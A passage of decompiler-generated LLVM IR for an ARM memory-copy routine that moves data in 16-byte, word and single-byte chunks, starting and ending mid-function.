  %v0_173e094 = phi i32 [ %v1_173a0, %dec_label_pc_173c0 ], [ %v0_175bc77, %dec_label_pc_17494 ]
  %v0_173dc93 = phi i32 [ %v0_173a0, %dec_label_pc_173c0 ], [ %v0_17494, %dec_label_pc_17494 ]
  %v0_173c8 = phi i32 [ %v2_173b0, %dec_label_pc_173c0 ], [ %v2_1748c, %dec_label_pc_17494 ]
  %v1_173c8 = add i32 %v0_173c8, -8
  store i32 %v1_173c8, i32* %r2.global-to-local, align 4
  %v3_173c8 = sub i32 7, %v0_173c8
  %v4_173c8 = and i32 %v3_173c8, %v0_173c8
  %v5_173c8 = icmp slt i32 %v4_173c8, 0
  store i1 %v5_173c8, i1* %cpsr_v.global-to-local, align 1
  %v6_173c8 = icmp slt i32 %v1_173c8, 0
  store i1 %v6_173c8, i1* %cpsr_n.global-to-local, align 1
  %v7_173c8 = icmp eq i32 %v0_173c8, 8
  store i1 %v7_173c8, i1* %cpsr_z.global-to-local, align 1
  %v2_173cc = xor i1 %v6_173c8, %v5_173c8
  br i1 %v2_173cc, label %dec_label_pc_1741c, label %dec_label_pc_173d0

dec_label_pc_173d0:                               ; preds = %dec_label_pc_173c8
  %v1_173d0 = add i32 %v0_173c8, -28
  store i32 %v1_173d0, i32* %r2.global-to-local, align 4
  %v3_173d0 = sub i32 27, %v0_173c8
  %v4_173d0 = and i32 %v3_173d0, %v1_173c8
  %v5_173d0 = icmp slt i32 %v4_173d0, 0
  store i1 %v5_173d0, i1* %cpsr_v.global-to-local, align 1
  %v6_173d0 = icmp slt i32 %v1_173d0, 0
  store i1 %v6_173d0, i1* %cpsr_n.global-to-local, align 1
  %v7_173d0 = icmp eq i32 %v1_173c8, 20
  store i1 %v7_173d0, i1* %cpsr_z.global-to-local, align 1
  %v2_173d4 = xor i1 %v6_173d0, %v5_173d0
  br i1 %v2_173d4, label %dec_label_pc_17408, label %dec_label_pc_173d8

dec_label_pc_173d8:                               ; preds = %dec_label_pc_173d0
  %v0_173d8 = load i32, i32* @r4, align 4
  store i32 %v0_173d8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_173dc

dec_label_pc_173dc:                               ; preds = %dec_label_pc_173dc.dec_label_pc_173dc_crit_edge, %dec_label_pc_173d8
  %v0_173e0 = phi i32 [ %v12_173e8, %dec_label_pc_173dc.dec_label_pc_173dc_crit_edge ], [ %v0_173e094, %dec_label_pc_173d8 ]
  %v0_173dc = phi i32 [ %v0_173dc.pre, %dec_label_pc_173dc.dec_label_pc_173dc_crit_edge ], [ %v0_173dc93, %dec_label_pc_173d8 ]
  %v1_173dc = inttoptr i32 %v0_173dc to i32*
  %v2_173dc = load i32, i32* %v1_173dc, align 4
  %v3_173dc = add i32 %v0_173dc, 4
  %v4_173dc = inttoptr i32 %v3_173dc to i32*
  %v5_173dc = load i32, i32* %v4_173dc, align 4
  store i32 %v5_173dc, i32* %r4.global-to-local, align 4
  %v6_173dc = add i32 %v0_173dc, 8
  %v7_173dc = inttoptr i32 %v6_173dc to i32*
  %v8_173dc = load i32, i32* %v7_173dc, align 4
  store i32 %v8_173dc, i32* %ip.global-to-local, align 4
  %v9_173dc = add i32 %v0_173dc, 12
  %v10_173dc = inttoptr i32 %v9_173dc to i32*
  %v11_173dc = load i32, i32* %v10_173dc, align 4
  store i32 %v11_173dc, i32* %lr.global-to-local, align 4
  %v12_173dc = add i32 %v0_173dc, 16
  store i32 %v12_173dc, i32* %r1.global-to-local, align 4
  %v1_173e0 = inttoptr i32 %v0_173e0 to i32*
  store i32 %v2_173dc, i32* %v1_173e0, align 4
  %v3_173e0 = add i32 %v0_173e0, 4
  %v4_173e0 = inttoptr i32 %v3_173e0 to i32*
  %v5_173e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_173e0, i32* %v4_173e0, align 4
  %v6_173e0 = add i32 %v0_173e0, 8
  %v7_173e0 = inttoptr i32 %v6_173e0 to i32*
  %v8_173e0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_173e0, i32* %v7_173e0, align 4
  %v9_173e0 = add i32 %v0_173e0, 12
  %v10_173e0 = inttoptr i32 %v9_173e0 to i32*
  %v11_173e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_173e0, i32* %v10_173e0, align 4
  %v12_173e0 = add i32 %v0_173e0, 16
  store i32 %v12_173e0, i32* %r0.global-to-local, align 4
  %v0_173e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_173e4 = inttoptr i32 %v0_173e4 to i32*
  %v2_173e4 = load i32, i32* %v1_173e4, align 4
  store i32 %v2_173e4, i32* @r3, align 4
  %v3_173e4 = add i32 %v0_173e4, 4
  %v4_173e4 = inttoptr i32 %v3_173e4 to i32*
  %v5_173e4 = load i32, i32* %v4_173e4, align 4
  store i32 %v5_173e4, i32* %r4.global-to-local, align 4
  %v6_173e4 = add i32 %v0_173e4, 8
  %v7_173e4 = inttoptr i32 %v6_173e4 to i32*
  %v8_173e4 = load i32, i32* %v7_173e4, align 4
  store i32 %v8_173e4, i32* @ip, align 4
  %v9_173e4 = add i32 %v0_173e4, 12
  %v10_173e4 = inttoptr i32 %v9_173e4 to i32*
  %v11_173e4 = load i32, i32* %v10_173e4, align 4
  store i32 %v11_173e4, i32* %lr.global-to-local, align 4
  %v12_173e4 = add i32 %v0_173e4, 16
  store i32 %v12_173e4, i32* @r1, align 4
  %v1_173e8 = inttoptr i32 %v12_173e0 to i32*
  store i32 %v2_173e4, i32* %v1_173e8, align 4
  %v3_173e8 = add i32 %v0_173e0, 20
  %v4_173e8 = inttoptr i32 %v3_173e8 to i32*
  %v5_173e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_173e8, i32* %v4_173e8, align 4
  %v6_173e8 = add i32 %v0_173e0, 24
  %v7_173e8 = inttoptr i32 %v6_173e8 to i32*
  %v8_173e8 = load i32, i32* @ip, align 4
  store i32 %v8_173e8, i32* %v7_173e8, align 4
  %v9_173e8 = add i32 %v0_173e0, 28
  %v10_173e8 = inttoptr i32 %v9_173e8 to i32*
  %v11_173e8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_173e8, i32* %v10_173e8, align 4
  %v12_173e8 = add i32 %v0_173e0, 32
  store i32 %v12_173e8, i32* @r0, align 4
  %v0_173ec = load i32, i32* %r2.global-to-local, align 4
  %v1_173ec = add i32 %v0_173ec, -32
  store i32 %v1_173ec, i32* %r2.global-to-local, align 4
  %v3_173ec = sub i32 31, %v0_173ec
  %v4_173ec = and i32 %v3_173ec, %v0_173ec
  %v5_173ec = icmp slt i32 %v4_173ec, 0
  %v6_173ec = icmp slt i32 %v1_173ec, 0
  %v2_173f0 = xor i1 %v6_173ec, %v5_173ec
  br i1 %v2_173f0, label %dec_label_pc_173f4, label %dec_label_pc_173dc.dec_label_pc_173dc_crit_edge

dec_label_pc_173dc.dec_label_pc_173dc_crit_edge:  ; preds = %dec_label_pc_173dc
  %v0_173dc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_173dc

dec_label_pc_173f4:                               ; preds = %dec_label_pc_173dc
  %v1_173f4 = add i32 %v0_173ec, -16
  %v3_173f4 = add i32 %v0_173ec, 2147483616
  %v4_173f4 = and i32 %v1_173f4, %v3_173f4
  %v5_173f4 = icmp slt i32 %v4_173f4, 0
  store i1 %v5_173f4, i1* %cpsr_v.global-to-local, align 1
  %v6_173f4 = icmp slt i32 %v1_173f4, 0
  store i1 %v6_173f4, i1* %cpsr_n.global-to-local, align 1
  %v7_173f4 = icmp eq i32 %v1_173f4, 0
  store i1 %v7_173f4, i1* %cpsr_z.global-to-local, align 1
  %v2_173f8 = xor i1 %v6_173f4, %v5_173f4
  br i1 %v2_173f8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_173f4
  %v3_173f8 = load i32, i32* @r1, align 4
  %v4_173f8 = inttoptr i32 %v3_173f8 to i32*
  %v5_173f8 = load i32, i32* %v4_173f8, align 4
  store i32 %v5_173f8, i32* @r3, align 4
  %v6_173f8 = add i32 %v3_173f8, 4
  %v7_173f8 = inttoptr i32 %v6_173f8 to i32*
  %v8_173f8 = load i32, i32* %v7_173f8, align 4
  store i32 %v8_173f8, i32* %r4.global-to-local, align 4
  %v9_173f8 = add i32 %v3_173f8, 8
  %v10_173f8 = inttoptr i32 %v9_173f8 to i32*
  %v11_173f8 = load i32, i32* %v10_173f8, align 4
  store i32 %v11_173f8, i32* @ip, align 4
  %v12_173f8 = add i32 %v3_173f8, 12
  %v13_173f8 = inttoptr i32 %v12_173f8 to i32*
  %v14_173f8 = load i32, i32* %v13_173f8, align 4
  store i32 %v14_173f8, i32* %lr.global-to-local, align 4
  %v15_173f8 = add i32 %v3_173f8, 16
  store i32 %v15_173f8, i32* @r1, align 4
  %v4_173fc = inttoptr i32 %v12_173e8 to i32*
  store i32 %v5_173f8, i32* %v4_173fc, align 4
  %v6_173fc = add i32 %v0_173e0, 36
  %v7_173fc = inttoptr i32 %v6_173fc to i32*
  %v8_173fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_173fc, i32* %v7_173fc, align 4
  %v9_173fc = add i32 %v0_173e0, 40
  %v10_173fc = inttoptr i32 %v9_173fc to i32*
  %v11_173fc = load i32, i32* @ip, align 4
  store i32 %v11_173fc, i32* %v10_173fc, align 4
  %v12_173fc = add i32 %v0_173e0, 44
  %v13_173fc = inttoptr i32 %v12_173fc to i32*
  %v14_173fc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_173fc, i32* %v13_173fc, align 4
  %v15_173fc = add i32 %v0_173e0, 48
  store i32 %v15_173fc, i32* @r0, align 4
  %v3_17400 = load i32, i32* %r2.global-to-local, align 4
  %v4_17400 = add i32 %v3_17400, -16
  store i32 %v4_17400, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_173f4, %bb136
  %v3_17410102111 = phi i32 [ %v15_173fc, %bb136 ], [ %v12_173e8, %dec_label_pc_173f4 ]
  %v0_17408.pre = phi i32 [ %v4_17400, %bb136 ], [ %v1_173ec, %dec_label_pc_173f4 ]
  %v2_17404 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17404, i32* @r4, align 4
  br label %dec_label_pc_17408

dec_label_pc_17408:                               ; preds = %dec_label_pc_173d0, %bb137
  %v3_17410101 = phi i32 [ %v0_173e094, %dec_label_pc_173d0 ], [ %v3_17410102111, %bb137 ]
  %v0_17408 = phi i32 [ %v1_173d0, %dec_label_pc_173d0 ], [ %v0_17408.pre, %bb137 ]
  %v1_17408 = add i32 %v0_17408, 20
  store i32 %v1_17408, i32* %r2.global-to-local, align 4
  %v3_17408 = sub i32 0, %v0_17408
  %v4_17408 = and i32 %v1_17408, %v3_17408
  %v5_17408 = icmp slt i32 %v4_17408, 0
  store i1 %v5_17408, i1* %cpsr_v.global-to-local, align 1
  %v6_17408 = icmp slt i32 %v1_17408, 0
  store i1 %v6_17408, i1* %cpsr_n.global-to-local, align 1
  %v7_17408 = icmp eq i32 %v1_17408, 0
  store i1 %v7_17408, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1740c

dec_label_pc_1740c:                               ; preds = %.thread115, %dec_label_pc_17408
  %v0_1741c.pre157 = phi i32 [ %v0_1741c.pre, %.thread115 ], [ %v1_17408, %dec_label_pc_17408 ]
  %v3_17410 = phi i32 [ %v3_1741099116, %.thread115 ], [ %v3_17410101, %dec_label_pc_17408 ]
  %v1_17414 = phi i1 [ %v1_17418, %.thread115 ], [ %v5_17408, %dec_label_pc_17408 ]
  %v0_17414 = phi i1 [ %v0_17418, %.thread115 ], [ %v6_17408, %dec_label_pc_17408 ]
  %v2_1740c = xor i1 %v1_17414, %v0_17414
  br i1 %v2_1740c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1740c
  %v3_1740c = load i32, i32* @r1, align 4
  %v4_1740c = inttoptr i32 %v3_1740c to i32*
  %v5_1740c = load i32, i32* %v4_1740c, align 4
  store i32 %v5_1740c, i32* @r3, align 4
  %v6_1740c = add i32 %v3_1740c, 4
  %v7_1740c = inttoptr i32 %v6_1740c to i32*
  %v8_1740c = load i32, i32* %v7_1740c, align 4
  store i32 %v8_1740c, i32* @ip, align 4
  %v9_1740c = add i32 %v3_1740c, 8
  %v10_1740c = inttoptr i32 %v9_1740c to i32*
  %v11_1740c = load i32, i32* %v10_1740c, align 4
  store i32 %v11_1740c, i32* %lr.global-to-local, align 4
  %v12_1740c = add i32 %v3_1740c, 12
  store i32 %v12_1740c, i32* @r1, align 4
  %v4_17410 = inttoptr i32 %v3_17410 to i32*
  store i32 %v5_1740c, i32* %v4_17410, align 4
  %v6_17410 = add i32 %v3_17410, 4
  %v7_17410 = inttoptr i32 %v6_17410 to i32*
  %v8_17410 = load i32, i32* @ip, align 4
  store i32 %v8_17410, i32* %v7_17410, align 4
  %v9_17410 = add i32 %v3_17410, 8
  %v10_17410 = inttoptr i32 %v9_17410 to i32*
  %v11_17410 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17410, i32* %v10_17410, align 4
  %v12_17410 = add i32 %v3_17410, 12
  store i32 %v12_17410, i32* @r0, align 4
  %v3_17414 = load i32, i32* %r2.global-to-local, align 4
  %v4_17414 = add i32 %v3_17414, -12
  store i32 %v4_17414, i32* %r2.global-to-local, align 4
  %v6_17414 = sub i32 11, %v3_17414
  %v7_17414 = and i32 %v6_17414, %v3_17414
  %v8_17414 = icmp slt i32 %v7_17414, 0
  store i1 %v8_17414, i1* %cpsr_v.global-to-local, align 1
  %v9_17414 = icmp slt i32 %v4_17414, 0
  store i1 %v9_17414, i1* %cpsr_n.global-to-local, align 1
  %v10_17414 = icmp eq i32 %v3_17414, 12
  store i1 %v10_17414, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1740c, %bb138
  %v0_1741c.pre = phi i32 [ %v4_17414, %bb138 ], [ %v0_1741c.pre157, %dec_label_pc_1740c ]
  %v3_1741099116 = phi i32 [ %v12_17410, %bb138 ], [ %v3_17410, %dec_label_pc_1740c ]
  %v1_17418 = phi i1 [ %v8_17414, %bb138 ], [ %v1_17414, %dec_label_pc_1740c ]
  %v0_17418 = phi i1 [ %v9_17414, %bb138 ], [ %v0_17414, %dec_label_pc_1740c ]
  %v2_17418 = xor i1 %v1_17418, %v0_17418
  br i1 %v2_17418, label %dec_label_pc_1741c, label %dec_label_pc_1740c

dec_label_pc_1741c:                               ; preds = %.thread115, %dec_label_pc_173c8
  %v4_1742c = phi i32 [ %v0_173e094, %dec_label_pc_173c8 ], [ %v3_1741099116, %.thread115 ]
  %v0_1741c = phi i32 [ %v1_173c8, %dec_label_pc_173c8 ], [ %v0_1741c.pre, %.thread115 ]
  %v1_1741c = add i32 %v0_1741c, 8
  store i32 %v1_1741c, i32* %r2.global-to-local, align 4
  %v3_1741c = sub i32 0, %v0_1741c
  %v4_1741c = and i32 %v1_1741c, %v3_1741c
  %v5_1741c = icmp slt i32 %v4_1741c, 0
  store i1 %v5_1741c, i1* %cpsr_v.global-to-local, align 1
  %v6_1741c = icmp slt i32 %v1_1741c, 0
  store i1 %v6_1741c, i1* %cpsr_n.global-to-local, align 1
  %v7_1741c = icmp eq i32 %v1_1741c, 0
  store i1 %v7_1741c, i1* %cpsr_z.global-to-local, align 1
  %v2_17420 = xor i1 %v6_1741c, %v5_1741c
  br i1 %v2_17420, label %bb140, label %dec_label_pc_17424

dec_label_pc_17424:                               ; preds = %dec_label_pc_1741c
  %v1_17424 = add i32 %v0_1741c, 4
  store i32 %v1_17424, i32* %r2.global-to-local, align 4
  %v3_17424 = sub i32 -5, %v0_1741c
  %v4_17424 = and i32 %v3_17424, %v1_1741c
  %v5_17424 = icmp slt i32 %v4_17424, 0
  store i1 %v5_17424, i1* %cpsr_v.global-to-local, align 1
  %v6_17424 = icmp slt i32 %v1_17424, 0
  store i1 %v6_17424, i1* %cpsr_n.global-to-local, align 1
  %v7_17424 = icmp eq i32 %v1_1741c, 4
  store i1 %v7_17424, i1* %cpsr_z.global-to-local, align 1
  %v2_17428 = xor i1 %v6_17424, %v5_17424
  %v3_17428 = load i32, i32* @r1, align 4
  %v4_17428 = inttoptr i32 %v3_17428 to i32*
  %v5_17428 = load i32, i32* %v4_17428, align 4
  store i32 %v5_17428, i32* @r3, align 4
  %v7_17428 = add i32 %v3_17428, 4
  br i1 %v2_17428, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_17424
  store i32 %v7_17428, i32* @r1, align 4
  %v5_1742c = inttoptr i32 %v4_1742c to i32*
  store i32 %v5_17428, i32* %v5_1742c, align 4
  %v6_1742c = load i32, i32* @r0, align 4
  %v7_1742c = add i32 %v6_1742c, 4
  store i32 %v7_1742c, i32* @r0, align 4
  %v0_1743c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_17424
  %v7_17430 = inttoptr i32 %v7_17428 to i32*
  %v8_17430 = load i32, i32* %v7_17430, align 4
  store i32 %v8_17430, i32* @ip, align 4
  %v9_17430 = add i32 %v3_17428, 8
  store i32 %v9_17430, i32* @r1, align 4
  %v4_17434 = inttoptr i32 %v4_1742c to i32*
  store i32 %v5_17428, i32* %v4_17434, align 4
  %v6_17434 = add i32 %v4_1742c, 4
  %v7_17434 = inttoptr i32 %v6_17434 to i32*
  %v8_17434 = load i32, i32* @ip, align 4
  store i32 %v8_17434, i32* %v7_17434, align 4
  %v9_17434 = add i32 %v4_1742c, 8
  store i32 %v9_17434, i32* @r0, align 4
  %v3_17438 = load i32, i32* %r2.global-to-local, align 4
  %v4_17438 = add i32 %v3_17438, -4
  store i32 %v4_17438, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1741c, %bb, %dec_label_pc_175ec, %dec_label_pc_17580, %dec_label_pc_17514, %bb139
  %v0_1743c = phi i32 [ %v0_1743c.pre, %.thread122 ], [ %v2_1748c, %.thread128 ], [ %v1_1741c, %dec_label_pc_1741c ], [ %v2_173b0, %bb ], [ %v0_1743c61, %dec_label_pc_175ec ], [ %v0_1743c60, %dec_label_pc_17580 ], [ %v0_1743c59, %dec_label_pc_17514 ], [ %v4_17438, %bb139 ]
  %v1_1743c = add i32 %v0_1743c, 4
  store i32 %v1_1743c, i32* %r2.global-to-local, align 4
  %v3_1743c = sub i32 0, %v0_1743c
  %v4_1743c = and i32 %v1_1743c, %v3_1743c
  %v5_1743c = icmp slt i32 %v4_1743c, 0
  store i1 %v5_1743c, i1* %cpsr_v.global-to-local, align 1
  %v6_1743c = icmp slt i32 %v1_1743c, 0
  store i1 %v6_1743c, i1* %cpsr_n.global-to-local, align 1
  %v7_1743c = icmp eq i32 %v1_1743c, 0
  store i1 %v7_1743c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1743c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_17444.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_17440 = load i8*, i8** %stack_var_-8, align 4
  %v4_17440 = ptrtoint i8* %v3_17440 to i32
  store i32 %v4_17440, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_17444 = phi i32 [ %v0_17444.pre, %bb140.bb142_crit_edge ], [ %v8_173ac, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1743c, i32 %v0_17444)
  %v0_17448 = load i32, i32* %r2.global-to-local, align 4
  %v1_17448 = add i32 %v0_17448, -2
  %v3_17448 = sub i32 1, %v0_17448
  %v4_17448 = and i32 %v3_17448, %v0_17448
  %v5_17448 = icmp slt i32 %v4_17448, 0
  store i1 %v5_17448, i1* %cpsr_v.global-to-local, align 1
  %v6_17448 = icmp slt i32 %v1_17448, 0
  store i1 %v6_17448, i1* %cpsr_n.global-to-local, align 1
  %v7_17448 = icmp eq i32 %v0_17448, 2
  store i1 %v7_17448, i1* %cpsr_z.global-to-local, align 1
  %v0_1744c = load i32, i32* @r1, align 4
  %v1_1744c = inttoptr i32 %v0_1744c to i8*
  %v2_1744c = load i8, i8* %v1_1744c, align 1
  %v5_1744c = add i32 %v0_1744c, 1
  store i32 %v5_1744c, i32* %r1.global-to-local, align 4
  %v2_17450 = load i32, i32* @r0, align 4
  %v3_17450 = inttoptr i32 %v2_17450 to i8*
  store i8 %v2_1744c, i8* %v3_17450, align 1
  %v4_17450 = load i32, i32* @r0, align 4
  %v5_17450 = add i32 %v4_17450, 1
  store i32 %v5_17450, i32* %r0.global-to-local, align 4
  %v0_17454 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17454 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17454 = xor i1 %v0_17454, %v1_17454
  br i1 %v2_17454, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_17454 = load i32, i32* %r1.global-to-local, align 4
  %v4_17454 = inttoptr i32 %v3_17454 to i8*
  %v5_17454 = load i8, i8* %v4_17454, align 1
  %v8_17454 = add i32 %v3_17454, 1
  store i32 %v8_17454, i32* %r1.global-to-local, align 4
  %v6_17458 = inttoptr i32 %v5_17450 to i8*
  store i8 %v5_17454, i8* %v6_17458, align 1
  %v7_17458 = load i32, i32* %r0.global-to-local, align 4
  %v8_17458 = add i32 %v7_17458, 1
  store i32 %v8_17458, i32* %r0.global-to-local, align 4
  %v1_1745c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1745c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_17460 = phi i32 [ %v8_17458, %bb143 ], [ %v5_17450, %bb142 ]
  %v2_17460 = phi i1 [ %v2_1745c.pre, %bb143 ], [ %v1_17454, %bb142 ]
  %v1_17460 = phi i1 [ %v1_1745c.pre, %bb143 ], [ %v0_17454, %bb142 ]
  %v0_1745c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1745c = xor i1 %v2_17460, %v1_17460
  %v4_1745c = or i1 %v0_1745c, %v3_1745c
  br i1 %v4_1745c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1745c = load i32, i32* %r1.global-to-local, align 4
  %v6_1745c = inttoptr i32 %v5_1745c to i8*
  %v7_1745c = load i8, i8* %v6_1745c, align 1
  %v10_1745c = add i32 %v5_1745c, 1
  store i32 %v10_1745c, i32* %r1.global-to-local, align 4
  %v8_17460 = inttoptr i32 %v7_17460 to i8*
  store i8 %v7_1745c, i8* %v8_17460, align 1
  %v9_17460 = load i32, i32* %r0.global-to-local, align 4
  %v10_17460 = add i32 %v9_17460, 1
  store i32 %v10_17460, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_17464 = load i8*, i8** %stack_var_-8, align 4
  %v3_17464 = ptrtoint i8* %v2_17464 to i32
  store i32 %v3_17464, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_173ac)
  %v0_1746c.pre = load i32, i32* @ip, align 4
  %v0_17474.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_17478.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1746c

dec_label_pc_1746c:                               ; preds = %dec_label_pc_173b8, %.thread126
  %v2_17478 = phi i32 [ %v1_173a0, %dec_label_pc_173b8 ], [ %v2_17478.pre, %.thread126 ]
  %v0_17474 = phi i32 [ %v0_173a0, %dec_label_pc_173b8 ], [ %v0_17474.pre, %.thread126 ]
  %v0_1746c = phi i32 [ %v1_173b8, %dec_label_pc_173b8 ], [ %v0_1746c.pre, %.thread126 ]
  %v1_1746c = sub i32 4, %v0_1746c
  store i32 %v1_1746c, i32* @ip, align 4
  %v1_17470 = add i32 %v1_1746c, -2
  %v3_17470 = sub i32 1, %v1_1746c
  %v4_17470 = and i32 %v3_17470, %v1_1746c
  %v5_17470 = icmp slt i32 %v4_17470, 0
  store i1 %v5_17470, i1* %cpsr_v.global-to-local, align 1
  %v6_17470 = icmp slt i32 %v1_17470, 0
  store i1 %v6_17470, i1* %cpsr_n.global-to-local, align 1
  %v7_17470 = icmp eq i32 %v1_1746c, 2
  store i1 %v7_17470, i1* %cpsr_z.global-to-local, align 1
  %v1_17474 = inttoptr i32 %v0_17474 to i8*
  %v2_17474 = load i8, i8* %v1_17474, align 1
  %v3_17474 = zext i8 %v2_17474 to i32
  store i32 %v3_17474, i32* @r3, align 4
  %v5_17474 = add i32 %v0_17474, 1
  store i32 %v5_17474, i32* @r1, align 4
  %v3_17478 = inttoptr i32 %v2_17478 to i8*
  store i8 %v2_17474, i8* %v3_17478, align 1
  %v4_17478 = load i32, i32* @r0, align 4
  %v5_17478 = add i32 %v4_17478, 1
  store i32 %v5_17478, i32* @r0, align 4
  %v0_1747c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1747c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1747c = xor i1 %v0_1747c, %v1_1747c
  br i1 %v2_1747c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1746c
  %v3_1747c = load i32, i32* @r1, align 4
  %v4_1747c = inttoptr i32 %v3_1747c to i8*
  %v5_1747c = load i8, i8* %v4_1747c, align 1
  %v6_1747c = zext i8 %v5_1747c to i32
  store i32 %v6_1747c, i32* @r3, align 4
  %v8_1747c = add i32 %v3_1747c, 1
  store i32 %v8_1747c, i32* @r1, align 4
  %v6_17480 = inttoptr i32 %v5_17478 to i8*
  store i8 %v5_1747c, i8* %v6_17480, align 1
  %v7_17480 = load i32, i32* @r0, align 4
  %v8_17480 = add i32 %v7_17480, 1
  store i32 %v8_17480, i32* @r0, align 4
  %v1_17484.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17484.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1746c, %bb145
  %v7_17488 = phi i32 [ %v8_17480, %bb145 ], [ %v5_17478, %dec_label_pc_1746c ]
  %v2_17488 = phi i1 [ %v2_17484.pre, %bb145 ], [ %v1_1747c, %dec_label_pc_1746c ]
  %v1_17488 = phi i1 [ %v1_17484.pre, %bb145 ], [ %v0_1747c, %dec_label_pc_1746c ]
  %v0_17484 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17484 = xor i1 %v2_17488, %v1_17488
  %v4_17484 = or i1 %v0_17484, %v3_17484
  br i1 %v4_17484, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_17484 = load i32, i32* @r1, align 4
  %v6_17484 = inttoptr i32 %v5_17484 to i8*
  %v7_17484 = load i8, i8* %v6_17484, align 1
  %v8_17484 = zext i8 %v7_17484 to i32
  store i32 %v8_17484, i32* @r3, align 4
  %v10_17484 = add i32 %v5_17484, 1
  store i32 %v10_17484, i32* @r1, align 4
  %v8_17488 = inttoptr i32 %v7_17488 to i8*
  store i8 %v7_17484, i8* %v8_17488, align 1
  %v9_17488 = load i32, i32* @r0, align 4
  %v10_17488 = add i32 %v9_17488, 1
  store i32 %v10_17488, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_175bc77 = phi i32 [ %v10_17488, %bb146 ], [ %v7_17488, %.thread127 ]
  %v0_1748c = load i32, i32* %r2.global-to-local, align 4
  %v1_1748c = load i32, i32* @ip, align 4
  %v2_1748c = sub i32 %v0_1748c, %v1_1748c
  store i32 %v2_1748c, i32* %r2.global-to-local, align 4
  %v4_1748c = xor i32 %v1_1748c, %v0_1748c
  %v5_1748c = xor i32 %v2_1748c, %v0_1748c
  %v6_1748c = and i32 %v5_1748c, %v4_1748c
  %v7_1748c = icmp slt i32 %v6_1748c, 0
  store i1 %v7_1748c, i1* %cpsr_v.global-to-local, align 1
  %v8_1748c = icmp slt i32 %v2_1748c, 0
  store i1 %v8_1748c, i1* %cpsr_n.global-to-local, align 1
  %v9_1748c = icmp eq i32 %v0_1748c, %v1_1748c
  store i1 %v9_1748c, i1* %cpsr_z.global-to-local, align 1
  %v2_17490 = xor i1 %v8_1748c, %v7_1748c
  br i1 %v2_17490, label %bb140, label %dec_label_pc_17494

dec_label_pc_17494:                               ; preds = %.thread128
  %v0_17494 = load i32, i32* @r1, align 4
  %v1_17494 = urem i32 %v0_17494, 4
  store i32 %v1_17494, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17494 = icmp eq i32 %v1_17494, 0
  store i1 %v2_17494, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_17494 to i2
  br i1 %v2_17494, label %dec_label_pc_173c8, label %dec_label_pc_1749c

dec_label_pc_1749c:                               ; preds = %dec_label_pc_173c0, %dec_label_pc_17494
  %v0_175bc76 = phi i32 [ %v1_173a0, %dec_label_pc_173c0 ], [ %v0_175bc77, %dec_label_pc_17494 ]
  %v0_17524 = phi i32 [ %v2_173b0, %dec_label_pc_173c0 ], [ %v2_1748c, %dec_label_pc_17494 ]
  %v0_174a4.off0 = phi i2 [ %extract.t, %dec_label_pc_173c0 ], [ %extract.t131, %dec_label_pc_17494 ]
  %v0_1749c = phi i32 [ %v0_173a0, %dec_label_pc_173c0 ], [ %v0_17494, %dec_label_pc_17494 ]
  %v1_1749c = and i32 %v0_1749c, -4
  store i32 %v1_1749c, i32* %r1.global-to-local, align 4
  %v1_174a0 = inttoptr i32 %v1_1749c to i32*
  %v2_174a0 = load i32, i32* %v1_174a0, align 4
  store i32 %v2_174a0, i32* %lr.global-to-local, align 4
  %v4_174a0 = add i32 %v1_1749c, 4
  store i32 %v4_174a0, i32* %r1.global-to-local, align 4
